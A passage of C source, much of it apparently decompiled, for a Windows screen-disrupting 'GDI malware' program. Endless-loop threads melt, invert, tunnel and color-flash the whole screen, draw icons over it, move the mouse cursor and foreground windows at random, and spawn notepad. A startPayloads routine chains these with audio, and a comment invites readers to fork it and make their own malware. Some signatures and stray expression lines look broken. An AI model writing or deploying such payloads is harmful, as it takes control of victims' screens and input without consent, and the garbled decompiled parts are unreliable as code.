            ((int)local_c < 1)) {
            uVar1 = rdtsc();
            uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar5 = uVar5 ^ uVar5 << 0x11;
            local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
            uVar1 = rdtsc();
            uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar5 = uVar5 ^ uVar5 << 0x11;
            local_c = (uVar5 << 5 ^ uVar5) % uVar4;
        }
        uVar2 = rdtsc();
        left = local_8 - 0x3c;
        top = local_c - 0x3c;
        uVar5 = (uint)uVar2 & 3;
        right = local_8 + 0x3c;
        bottom = local_c + 0x3c;
        local_1c = 10;
        local_10 = right;
        do {
            if ((uVar2 & 3) == 0) {
                Ellipse(hdc, left, top, right, bottom);
                local_8 = local_8 + 0x14;
                left = left + 0x14;
                local_10 = local_10 + 0x14;
                bottom = bottom + 0x14;
                local_c = local_c + 0x14;
                top = top + 0x14;
            LAB_004020f7:
                Sleep(0x82);
                right = local_10;
            }
            else {
                if (uVar5 == 1) {
                    Ellipse(hdc, left, top, right, bottom);
                    local_8 = local_8 + 0x14;
                    local_10 = local_10 + 0x14;
                    left = left + 0x14;
                LAB_004020ed:
                    local_c = local_c - 0x14;
                    bottom = bottom + -0x14;
                    top = top + -0x14;
                    goto LAB_004020f7;
                }
                if (uVar5 == 2) {
                    Ellipse(hdc, left, top, right, bottom);
                    local_8 = local_8 - 0x14;
                    left = left + -0x14;
                    local_10 = local_10 + -0x14;
                    bottom = bottom + 0x14;
                    local_c = local_c + 0x14;
                    top = top + 0x14;
                    goto LAB_004020f7;
                }
                if (uVar5 == 3) {
                    Ellipse(hdc, left, top, right, bottom);
                    local_8 = local_8 - 0x14;
                    local_10 = local_10 + -0x14;
                    left = left + -0x14;
                    goto LAB_004020ed;
                }
            }
            local_1c = local_1c + -1;
        } while (local_1c != 0);
        local_28 = local_28 + 1;
    } while (true);
}
DWORD WINAPI gdi5(LPVOID lpParam)
{
    ulonglong uVar1;
    int uVar2;
    uint uVar3;
    uint uVar4;
    HDC hDC;
    uint uVar5;
    HICON pHVar6;
    void* extraout_ECX;
    void* extraout_ECX_00;
    void* extraout_ECX_01;
    void* extraout_ECX_02;
    int extraout_EDX;
    uint uVar7;
    int extraout_EDX_00;
    int extraout_EDX_01;
    int extraout_EDX_02;
    int iVar8;
    double dVar9;
    int Y;
    uint Y_00;
    double local_18;
    double local_10;

    uVar3 = GetSystemMetrics(0);
    uVar4 = GetSystemMetrics(1);
    hDC = GetDC((HWND)0x0);
    do {
        do {
            while (true) {
                uVar1 = rdtsc();
                local_10 = 0.0;
                local_18 = 0.0;
                uVar5 = (uint)uVar1 & 3;
                if ((uVar1 & 3) == 0) break;
                if (uVar5 == 1) {
                    uVar2 = rdtsc();
                    uVar7 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
                    uVar7 = uVar7 ^ uVar7 << 0x11;
                    for (uVar5 = uVar3; 0 < (int)uVar5; uVar5 = uVar5 - 3) {
                        pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f03);
                        dVar9 = local_18;
                        (extraout_ECX_00, extraout_EDX_00);
                        DrawIcon(hDC, uVar5, (int)(dVar9 * local_10 + (double)((uVar7 << 5 ^ uVar7) % uVar4)),
                            pHVar6);
                        local_18 = local_18 + 0.05;
                        local_10 = local_10 + 0.32;
                        Sleep(10);
                    }
                }
                else if (uVar5 == 2) {
                    uVar2 = rdtsc();
                    iVar8 = 0;
                    uVar5 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
                    uVar5 = uVar5 ^ uVar5 << 0x11;
                    if (0 < (int)uVar4) {
                        do {
                            pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f04);
                            dVar9 = local_18;
                            Y = iVar8;
                            (extraout_ECX_01, extraout_EDX_01);
                            DrawIcon(hDC, (int)(dVar9 * local_10 + (double)((uVar5 << 5 ^ uVar5) % uVar3)), Y, pHVar6);
                            local_18 = local_18 + 0.05;
                            local_10 = local_10 + 0.32;
                            Sleep(10);
                            iVar8 = iVar8 + 3;
                        } while (iVar8 < (int)uVar4);
                    }
                }
                else if (uVar5 == 3) {
                    uVar2 = rdtsc();
                    uVar7 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
                    uVar7 = uVar7 ^ uVar7 << 0x11;
                    for (uVar5 = uVar4; 0 < (int)uVar5; uVar5 = uVar5 - 3) {
                        pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f02);
                        dVar9 = local_18;
                        Y_00 = uVar5;
                        (extraout_ECX_02, extraout_EDX_02);
                        DrawIcon(hDC, (int)(dVar9 * local_10 + (double)((uVar7 << 5 ^ uVar7) % uVar3)), Y_00,
                            pHVar6);
                        local_18 = local_18 + 0.05;
                        local_10 = local_10 + 0.32;
                        Sleep(10);
                    }
                }
            }
            uVar2 = rdtsc();
            uVar5 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
            uVar5 = uVar5 ^ uVar5 << 0x11;
            iVar8 = 0;
        } while ((int)uVar3 < 1);
        do {
            pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f01);
            dVar9 = local_18;
            (extraout_ECX, extraout_EDX);
            DrawIcon(hDC, iVar8, (int)(dVar9 * local_10 + (double)((uVar5 << 5 ^ uVar5) % uVar4)), pHVar6);
            local_18 = local_18 + 0.05;
            local_10 = local_10 + 0.32;
            Sleep(10);
            iVar8 = iVar8 + 3;
        } while (iVar8 < (int)uVar3);
    } while (true);
}
DWORD WINAPI gdi6(LPVOID lpParam)
{
    int iVar1;
    int iVar2;
    HDC hdc;
    void* extraout_ECX;
    void* pvVar3;
    int iVar5;
    double dVar6;
    int y;
    int cx;
    int cy;
    HDC hdcSrc;
    int x1;
    int y1;
    DWORD rop;
    double local_10;

    iVar1 = GetSystemMetrics(0);
    iVar2 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    local_10 = 0.0;

    do {
        iVar5 = 0;
        if (0 < iVar2) {
            do {
                rop = 0xcc0020;
                x1 = 0;
                cy = 1;
                dVar6 = local_10;
                y = iVar5;
                cx = iVar1;
                hdcSrc = hdc;
                y1 = iVar5;
                BitBlt(hdc, (int)(dVar6 * 8.0), y, cx, cy, hdcSrc, x1, y1, rop);
                iVar5 = iVar5 + 1;
                local_10 = local_10 + 0.04;
            } while (iVar5 < iVar2);
        }
        Sleep(0x28);
    } while (true);
}
DWORD WINAPI gdi7(LPVOID lpParam)
{
    int uVar1;
    int uVar2;
    int uVar3;
    int uVar4;
    int cx;
    int cy;
    HDC hdc;

    cx = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do {
        uVar1 = rdtsc();
        uVar2 = rdtsc();
        uVar3 = rdtsc();
        uVar4 = rdtsc();
        BitBlt(hdc, (uint)uVar4 & 1, (uint)uVar3 & 1, cx, cy, hdc, (uint)uVar2 & 1, (uint)uVar1 & 1, 0x8800c6);
        Sleep(0x82);
    } while (true);
}
DWORD WINAPI gdi8(LPVOID lpParam)
{
    int uVar1;
    ulonglong uVar2;
    uint uVar3;
    uint uVar4;
    HDC hdc;
    uint uVar5;
    uint x1;
    uint y1;
    uint uVar6;
    int cx;
    int local_14;
    int local_10;

    uVar3 = GetSystemMetrics(0);
    uVar4 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do {
        do {
            while (true) {
                uVar1 = rdtsc();
                uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar5 = uVar5 ^ uVar5 << 0x11;
                x1 = (uVar5 << 5 ^ uVar5) % uVar3;
                uVar1 = rdtsc();
                uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar5 = uVar5 ^ uVar5 << 0x11;
                y1 = (uVar5 << 5 ^ uVar5) % uVar4;
                uVar2 = rdtsc();
                uVar5 = (uint)uVar2 & 3;
                uVar1 = rdtsc();
                uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar6 = uVar6 ^ uVar6 << 0x11;
                uVar1 = rdtsc();
                cx = (uVar6 ^ uVar6 << 5) % 300 + 200;
                uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar6 = uVar6 ^ uVar6 << 0x11;
                uVar6 = (uVar6 ^ uVar6 << 5) % 0x32;
                if ((uVar2 & 3) == 0) break;
                if (uVar5 == 1) {
                    local_10 = 0;
                    uVar5 = y1;
                    if (uVar6 != 0xffffffec) {
                        do {
                            BitBlt(hdc, local_10 + x1, uVar5, cx, cx, hdc, x1, y1, 0xcc0020);
                            Sleep(100);
                            local_10 = local_10 + 10;
                            uVar5 = uVar5 - 10;
                        } while (local_10 < (int)(uVar6 + 0x14));
                    }
                }
                else if (uVar5 == 2) {
                    local_14 = 0;
                    uVar5 = x1;
                    if (uVar6 != 0xffffffec) {
                        do {
                            BitBlt(hdc, uVar5, y1 + local_14, cx, cx, hdc, x1, y1, 0xcc0020);
                            Sleep(100);
                            local_14 = local_14 + 10;
                            uVar5 = uVar5 - 10;
                        } while (local_14 < (int)(uVar6 + 0x14));
                    }
                }
                else if ((uVar5 == 3) && (uVar6 != 0xffffffec)) {
                    local_14 = (uVar6 + 0x13) / 10 + 1;
                    uVar5 = x1;
                    do {
                        BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, 0xcc0020);
                        Sleep(100);
                        uVar5 = uVar5 - 10;
                        local_14 = local_14 + -1;
                    } while (local_14 != 0);
                }
            }
        } while (uVar6 == 0xffffffec);
        local_10 = (uVar6 + 0x13) / 10 + 1;
        uVar5 = x1;
        do {
            BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, 0xcc0020);
            Sleep(100);
            uVar5 = uVar5 + 10;
            local_10 = local_10 + -1;
        } while (local_10 != 0);
    } while (true);
}
DWORD WINAPI gdi9(LPVOID lpParam)
{
    HDC hDC;
    tagCURSORINFO local_28;
    tagPOINT local_14;
    uint local_c;
    hDC = GetDC((HWND)0x0);
    do {
        GetCursorPos(&local_14);
        local_28.cbSize = 0x14;
        GetCursorInfo(&local_28);
        DrawIcon(hDC, local_14.x, local_14.y, local_28.hCursor);
        Sleep(10);
    } while (true);
}
DWORD WINAPI gdi10(LPVOID lpParam)
{
    int uVar1;
    int uVar2;
    int uVar3;
    uint uVar4;
    uint uVar5;
    uint uVar6;
    HWND hWnd;
    uint uVar7;
    uint uVar8;
    uint uVar9;
    HWND hWndInsertAfter;
    UINT uFlags;

    uVar4 = GetSystemMetrics(0);
    uVar5 = GetSystemMetrics(1);
    GetDC((HWND)0x0);
    do {
        uVar1 = rdtsc();
        uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar6 = uVar6 ^ uVar6 << 0x11;
        uVar1 = rdtsc();
        uVar2 = rdtsc();
        uVar3 = rdtsc();
        uVar7 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar6 = (uVar6 << 5 ^ uVar6) % uVar5;
        uVar7 = uVar7 ^ uVar7 << 0x11;
        uFlags = 0;
        uVar9 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
        uVar7 = (uVar7 << 5 ^ uVar7) % uVar4;
        uVar9 = uVar9 ^ uVar9 << 0x11;
        uVar8 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
        uVar9 = (uVar9 << 5 ^ uVar9) % uVar5;
        uVar8 = uVar8 ^ uVar8 << 0x11;
        uVar8 = (uVar8 << 5 ^ uVar8) % uVar4;
        hWndInsertAfter = (HWND)0x0;
        hWnd = GetForegroundWindow();
        SetWindowPos(hWnd, hWndInsertAfter, uVar8, uVar9, uVar7, uVar6, uFlags);
        uVar1 = rdtsc();
        uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar6 = uVar6 ^ uVar6 << 0x11;
        Sleep((uVar6 ^ uVar6 << 5) % 800 + 600);
    } while (true);
}
DWORD WINAPI gdi11(LPVOID lpParam)
{
    ulonglong uVar1;
    int uVar2;
    int cx;
    int cy;
    int iVar3;
    int iVar4;
    HWND hWnd;
    int iVar5;
    int iVar6;
    uint uVar7;
    int iVar8;
    uint uVar9;
    int X;
    int iVar10;
    UINT uFlags;
    int local_34;
    int local_30;
    tagRECT local_1c;
    uint local_c;

    iVar3 = GetSystemMetrics(0);
    iVar4 = GetSystemMetrics(1);
    do {
        hWnd = GetForegroundWindow();
        GetWindowRect(hWnd, &local_1c);
        uVar1 = rdtsc();
        uVar9 = (uint)uVar1 & 3;
        if (local_1c.left < iVar3) {
            if (local_1c.top < iVar4) {
                if (local_1c.left < 1) goto LAB_00402a21;
                if (local_1c.top < 1) goto LAB_00402a1a;
            }
            else {
            LAB_00402a1a:
                local_1c.top = 0;
            }
        }
        else {
        LAB_00402a21:
            local_1c.left = 0;
        }
        cy = local_1c.top;
        cx = local_1c.left;
        uVar2 = rdtsc();
        uVar7 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
        uVar7 = uVar7 ^ uVar7 << 0x11;
        uVar7 = (uVar7 ^ uVar7 << 5) % 100;
        if (uVar7 != 0xffffffc4) {
            local_34 = (uVar7 + 0x3b) / 0x14 + 1;
            iVar5 = local_1c.left;
            iVar6 = local_1c.top;
            iVar8 = local_1c.left;
            local_30 = local_1c.top;
            do {
                X = iVar5;
                iVar10 = iVar6;
                uFlags = uVar9;
                if ((uVar1 & 3) == 0) {
                LAB_00402ab3:
                    SetWindowPos(hWnd, (HWND)0x0, X, iVar10, cx, cy, uFlags);
                    Sleep(10);
                }
                else {
                    if (uVar9 == 1) {
                    LAB_00402ab2:
                        X = iVar8;
                        uFlags = 0;
                        goto LAB_00402ab3;
                    }
                    iVar10 = local_30;
                    if (uVar9 == 2) {
                        uFlags = 0;
                        goto LAB_00402ab3;
                    }
                    if (uVar9 == 3) goto LAB_00402ab2;
                }
                local_30 = local_30 + -0x14;
                iVar6 = iVar6 + 0x14;
                iVar5 = iVar5 + 0x14;
                iVar8 = iVar8 + -0x14;
                local_34 = local_34 + -1;
            } while (local_34 != 0);
        }
    } while (true);
}
DWORD WINAPI gdi12(LPVOID lpParam)
{
    int uVar1;
    int uVar2;
    int uVar3;
    int uVar4;
    uint uVar5;
    uint uVar6;
    HDC hdc;
    uint uVar7;
    uint uVar8;

    uVar5 = GetSystemMetrics(0);
    uVar6 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do {
        uVar1 = rdtsc();
        uVar2 = rdtsc();
        uVar3 = rdtsc();
        uVar7 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
        uVar7 = uVar7 ^ uVar7 << 0x11;
        uVar3 = rdtsc();
        uVar8 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
        uVar8 = uVar8 ^ uVar8 << 0x11;
        uVar3 = rdtsc();
        uVar4 = rdtsc();
        BitBlt(hdc, (uint)uVar4 & 1, (uint)uVar3 & 1, (uVar8 << 5 ^ uVar8) % uVar5,
            (uVar7 << 5 ^ uVar7) % uVar6, hdc, (uint)uVar2 & 1, (uint)uVar1 & 1, 0xcc0020);
    } while (true);
}
DWORD WINAPI gdi13(LPVOID lpParam)
{
    uint uVar1;
    int iVar2;
    HWND pHVar3;
    uint uVar4;
    int iVar5;
    tagRECT* ptVar6;
    uint auStack68[4];
    int local_40;
    HDC local_3c;
    int local_38;
    tagRECT local_34;
    POINT local_24;
    int local_1c;
    int local_18;
    int local_14;
    int local_10;
    uint local_c;

    local_3c = GetDC((HWND)0x0);
    do {
        do {
            uVar1 = rdtsc();
            local_40 = 0;
            uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar4 = uVar4 ^ uVar4 << 0x11;
            iVar5 = (uVar4 ^ uVar4 << 5) % 0x41 + 0x3c;
            local_38 = iVar5;
        } while (iVar5 == 0);
        do {
            iVar2 = local_40;
            ptVar6 = &local_34;
            pHVar3 = GetDesktopWindow();
            GetWindowRect(pHVar3, ptVar6);
            local_24.x = local_34.left + iVar2;
            local_24.y = local_34.top - iVar2;
            local_1c = local_34.right + local_40;
            local_18 = local_34.top + local_40;
            local_14 = local_34.left - local_40;
            local_10 = local_34.bottom - local_40;
            PlgBlt(local_3c, &local_24, local_3c, 0, 0, local_34.right - local_34.left,
                local_34.bottom - local_34.top, (HBITMAP)0x0, 0, 0);
            Sleep(0x28);
            local_40 = local_40 + 0x14;
        } while (local_40 < iVar5);
        iVar5 = 0;
        do {
            ptVar6 = &local_34;
            pHVar3 = GetDesktopWindow();
            GetWindowRect(pHVar3, ptVar6);
            local_24.x = local_34.left - iVar5;
            local_24.y = iVar5 + local_34.top;
            local_1c = local_34.right - iVar5;
            local_18 = local_34.top - iVar5;
            local_14 = iVar5 + local_34.left;
            local_10 = iVar5 + local_34.bottom;
            PlgBlt(local_3c, &local_24, local_3c, 0, 0, local_34.right - local_34.left,
                local_34.bottom - local_34.top, (HBITMAP)0x0, 0, 0);
            Sleep(0x28);
            iVar5 = iVar5 + 0x14;
        } while (iVar5 < local_38);
    } while (true);
}
DWORD WINAPI gdi14(LPVOID lpParam)
{
    uint uVar1;
    int w;
    int h;
    HDC hdc;
    uint uVar2;
    uint uVar3;
    uint uVar4;
    HBRUSH h_00;

    w = GetSystemMetrics(0);
    h = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do {
        uVar1 = rdtsc();
        uVar2 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar2 = uVar2 ^ uVar2 << 0x11;
        uVar2 = uVar2 << 5 ^ uVar2;
        uVar1 = rdtsc();
        uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar3 = uVar3 ^ uVar3 << 0x11;
        uVar3 = uVar3 << 5 ^ uVar3;
        uVar1 = rdtsc();
        uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar4 = uVar4 ^ uVar4 << 0x11;
        h_00 = CreateSolidBrush(((uint)((ulonglong)(uVar4 << 5 ^ uVar4) * 0x8080808081 >> 0x27) & 0xf) << 0x10 | (uVar3 / 0xff + uVar3 & 0xff) << 8 | uVar2 / 0xff + uVar2 & 0xff);
        SelectObject(hdc, h_00);
        PatBlt(hdc, 0, 0, w, h, 0x5a0049);
        uVar1 = rdtsc();
        uVar2 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar2 = uVar2 ^ uVar2 << 0x11;
        Sleep((uVar2 ^ uVar2 << 5) % 200 + 0x82);
    } while (true);
}
DWORD WINAPI gdi15(LPVOID lpParam)
{
    uint uVar1;
    uint uVar2;
    uint uVar3;
    uint uVar4;
    uint uVar5;

    uVar2 = GetSystemMetrics(0);
    uVar3 = GetSystemMetrics(1);
    do {
        uVar1 = rdtsc();
        uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar5 = uVar5 ^ uVar5 << 0x11;
        uVar1 = rdtsc();
        uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar4 = uVar4 ^ uVar4 << 0x11;
        SetCursorPos((uVar4 << 5 ^ uVar4) % uVar2, (uVar5 << 5 ^ uVar5) % uVar3);
        uVar1 = rdtsc();
        uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar4 = uVar4 ^ uVar4 << 0x11;
        Sleep((uVar4 ^ uVar4 << 5) % 800 + 300);
    } while (true);
}
DWORD WINAPI gdi16(LPVOID lpParam)
{
    uint uVar1;
    ulonglong uVar2;
    int cx;
    uint uVar3;
    HDC hdc;
    uint uVar4;
    uint uVar5;
    int cy;
    int x;

    cx = GetSystemMetrics(0);
    uVar3 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do {
        while (true) {
            uVar1 = rdtsc();
            uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar4 = uVar4 ^ uVar4 << 0x11;
            uVar4 = (uVar4 << 5 ^ uVar4) % uVar3;
            uVar1 = rdtsc();
            uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar5 = uVar5 ^ uVar5 << 0x11;
            cy = (uVar5 ^ uVar5 << 5) % 0x50 + 0x32;
            x = 0;
            uVar2 = rdtsc();
            if ((uVar2 & 1) != 0) break;
            do {
                BitBlt(hdc, x, uVar4, cx, cy, hdc, 0, uVar4, 0xcc0020);
                x = x + 1;
            } while (x < 5);
        }
        do {
            BitBlt(hdc, x, uVar4, cx, cy, hdc, 0, uVar4, 0xcc0020);
            x = x + -1;
        } while (-5 < x);
    } while (true);
}
DWORD WINAPI gdi17(LPVOID lpParam)
{
    ulonglong uVar1;
    int cx;
    int cy;
    HDC hdc;
    DWORD rop;

    cx = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do {
        uVar1 = rdtsc();
        rop = 0x999999;
        if ((uVar1 & 1) != 0) {
            rop = 0x666666;
        }
        BitBlt(hdc, 1, 1, cx, cy, hdc, 0, 0, rop);
        Sleep(0x28);
        BitBlt(hdc, -1, 1, cx, cy, hdc, 0, 0, rop);
        Sleep(0x28);
        BitBlt(hdc, 1, -1, cx, cy, hdc, 0, 0, rop);
        Sleep(0x28);
        BitBlt(hdc, -1, -1, cx, cy, hdc, 0, 0, rop);
        Sleep(0x28);
    } while (true);
}
DWORD WINAPI gdi18(LPVOID lpParam)
{
    uint uVar1;
    ulonglong uVar2;
    uint cx;
    uint cy;
    HDC hdc;
    HRGN pHVar3;
    uint uVar4;
    uint x1;
    uint uVar5;
    int iVar6;
    int local_14;

    cx = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
LAB_00403140:
    do {
        uVar1 = rdtsc();
        uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar4 = uVar4 ^ uVar4 << 0x11;
        x1 = (uVar4 << 5 ^ uVar4) % cx;
        uVar1 = rdtsc();
        uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar4 = uVar4 ^ uVar4 << 0x11;
        uVar5 = (uVar4 << 5 ^ uVar4) % cy;
        uVar1 = rdtsc();
        uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar4 = uVar4 ^ uVar4 << 0x11;
        uVar4 = (uVar4 ^ uVar4 << 5) % 600;
        uVar2 = rdtsc();
        if ((uVar2 & 1) == 0) {
            if (uVar4 != 0xfffffe0c) {
                iVar6 = uVar5 - x1;
                local_14 = (uVar4 + 499) / 0x1e + 1;
                uVar4 = x1;
                do {
                    pHVar3 = CreateEllipticRgn(x1, iVar6 + x1, uVar4, iVar6 + uVar4);
                    SelectClipRgn(hdc, pHVar3);
                    BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x330008);
                    Sleep(1);
                    uVar4 = uVar4 + 0x1e;
                    x1 = x1 - 0x1e;
                    local_14 = local_14 + -1;
                } while (local_14 != 0);
                Sleep(1);
                goto LAB_00403140;
            }
        }
        else if (uVar4 != 0xfffffe0c) {
            iVar6 = uVar5 - x1;
            local_14 = (uVar4 + 499) / 0x1e + 1;
            uVar4 = x1;
            do {
                pHVar3 = CreateRectRgn(x1, x1 + iVar6, uVar4, uVar4 + iVar6);
                SelectClipRgn(hdc, pHVar3);
                BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x330008);
                Sleep(1);
                uVar4 = uVar4 + 0x1e;
                x1 = x1 - 0x1e;
                local_14 = local_14 + -1;
            } while (local_14 != 0);
        }
        Sleep(1);
    } while (true);
}
DWORD winapi gdi19(lpvoid lpParam)
{
    uint uVar1;
    uint uVar2;
    int cy;
    HDC hdc;
    uint uVar3;
    uint uVar4;

    uVar2 = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do {
        uVar1 = rdtsc();
        uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar3 = uVar3 ^ uVar3 << 0x11;
        uVar3 = (uVar3 << 5 ^ uVar3) % uVar2;
        uVar1 = rdtsc();
        uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar4 = uVar4 ^ uVar4 << 0x11;
        uVar4 = uVar4 ^ uVar4 << 5;
        BitBlt(hdc, uVar3, 0, 100, cy, hdc, uVar3,
            uVar4 + (((uint)((ulonglong)uVar4 * 0x124924925 >> 0x21) & 0xfffffff8) - uVar4 / 0xe) *
            -2 + -5, 0xee0086);
    } while (true);
}
dword winapi gdi20(lpvoid lpParam)
{
    ulonglong uVar1;
    HDC hdcDest;
    HWND pHVar2;
    tagRECT* ptVar3;
    uint auStack60[4];
    int local_38;
    tagRECT local_34;
    POINT local_24;
    int local_1c;
    int local_18;
    int local_14;
    int local_10;
    uint local_c;

    GetSystemMetrics(0);
    GetSystemMetrics(1);
    hdcDest = GetDC((HWND)0x0);
    do {
        while (uVar1 = rdtsc(), (uVar1 & 1) != 0) {
            local_38 = 0x1e;
            do {
                ptVar3 = &local_34;
                pHVar2 = GetDesktopWindow();
                GetWindowRect(pHVar2, ptVar3);
                local_24.x = local_34.left + -0x5a;
                local_24.y = local_34.top + 0x5a;
                local_1c = local_34.right + -0x5a;
                local_18 = local_34.top + -0x5a;
                local_14 = local_34.left + 0x5a;
                local_10 = local_34.bottom + 0x5a;
                PlgBlt(hdcDest, &local_24, hdcDest, 0, 0, local_34.right - local_34.left,
                    local_34.bottom - local_34.top, (HBITMAP)0x0, 0, 0);
                local_38 = local_38 + -1;
            } while (local_38 != 0);
        }
        local_38 = 0x1e;
        do {
            ptVar3 = &local_34;
            pHVar2 = GetDesktopWindow();
            GetWindowRect(pHVar2, ptVar3);
            local_24.x = local_34.left + 0x5a;
            local_24.y = local_34.top + -0x5a;
            local_1c = local_34.right + 0x5a;
            local_18 = local_34.top + 0x5a;
            local_14 = local_34.left + -0x5a;
            local_10 = local_34.bottom + -0x5a;
            PlgBlt(hdcDest, &local_24, hdcDest, 0, 0, local_34.right - local_34.left,
                local_34.bottom - local_34.top, (HBITMAP)0x0, 0, 0);
            local_38 = local_38 + -1;
        } while (local_38 != 0);
    } while (true);
}
dword winapi gdi21(lpvoid lpParam)
{
    int right;
    uint uVar1;
    int iVar2;
    int iVar3;
    HDC hdc;
    uint uVar4;
    uint uVar5;
    uint uVar6;
    HBRUSH h;
    int left;
    int local_8;

    iVar2 = GetSystemMetrics(0);
    iVar3 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    local_8 = 0;
    do {
        uVar1 = rdtsc();
        uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar4 = uVar4 ^ uVar4 << 0x11;
        uVar4 = uVar4 << 5 ^ uVar4;
        uVar1 = rdtsc();
        uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar5 = uVar5 ^ uVar5 << 0x11;
        uVar5 = uVar5 << 5 ^ uVar5;
        uVar1 = rdtsc();
        uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar6 = uVar6 ^ uVar6 << 0x11;
        h = CreateSolidBrush(((uint)((ulonglong)(uVar6 << 5 ^ uVar6) * 0x8080808081 >> 0x27) & 0xff) <<
            0x10 | (uVar5 / 0xff + uVar5 & 0xff) << 8 | uVar4 / 0xff + uVar4 & 0xff);
        SelectObject(hdc, h);
        if (0 < iVar2) {
            left = 0;
            do {
                right = left + 100;
                Rectangle(hdc, left, local_8 + 100, right, local_8);
                Sleep(10);
                left = right;
            } while (right < iVar2);
        }
        local_8 = local_8 + 100;
        if (iVar3 <= local_8) {
            local_8 = 0;
        }
        Sleep(0x1e);
    } while (true);
}

void startPayloads() {
    /*
    Main sh#t, main loop, etc.
    
    Here you can change where and when the payloads start
    
    Btw yea you can fork this and make you own malware just pls follow
    the LICENSE file on the GitHub ;)
    */

	HANDLE thread;
	DWORD ID;

    if (reader.GetBoolean("main", "undertalesfx", true)) { // if is true, default is, also true
        mciSendString(L"play ./res/start.mp3", NULL, 0, NULL);
    }

    Sleep(random() % 3000 + 2400);
	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);

    Sleep(random() % 5000 + 340);
    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)msgXD, 0, 0, &ID);
    Sleep(random() % 500 + 340);
    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);

	Sleep(random() % 5000 + 3400);
	HANDLE dark = CreateThread(0, 0, Dark, 0, 0, &ID);
    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	
	Sleep(random() % 4000 + 300);
	thread = CreateThread(0, 0, Cursors, 0, 0, &ID);
	thread = CreateThread(0, 0, Melter, 0, 0, &ID);
	thread = CreateThread(0, 0, fun1, 0, 0, &ID);
    system("notepad");
    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	
	Bytebeat1();

	Sleep(random() % 1500 + 1100);
    system("write");
	thread = CreateThread(0, 0, Melter, 0, 0, &ID);
	thread = CreateThread(0, 0, Trails, 0, 0, &ID);
	thread = CreateThread(0, 0, RGBCircle, 0, 0, &ID);
	thread = CreateThread(0, 0, IconWave, 0, 0, &ID);
	thread = CreateThread(0, 0, fun2, 0, 0, &ID);
	
	thread = CreateThread(0, 0, gdi1, 0, 0, &ID);

    //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
	
	Reset();
	Bytebeat2();
	TerminateThread(dark, 0);
	CloseHandle(dark);

	Sleep(random() % 14000 + 13000);
	thread = CreateThread(0, 0, Sinewave, 0, 0, &ID);
	thread = CreateThread(0, 0, gdi17, 0, 0, &ID);
	thread = CreateThread(0, 0, gdi18, 0, 0, &ID);
    system("notepad");
